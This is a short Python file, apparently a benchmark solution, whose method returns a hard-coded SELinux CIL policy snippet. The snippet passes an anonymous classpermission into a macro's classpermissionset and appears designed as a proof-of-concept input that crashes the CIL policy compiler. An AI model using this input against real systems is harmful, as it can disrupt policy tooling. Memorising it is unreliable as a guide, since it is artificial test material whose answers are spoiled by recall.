import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""
(class mycls (read write))
(macro m ((cp classpermission))
    (classpermissionset cs1 (cp))
)
(call m ((mycls (read))))
"""
        return poc
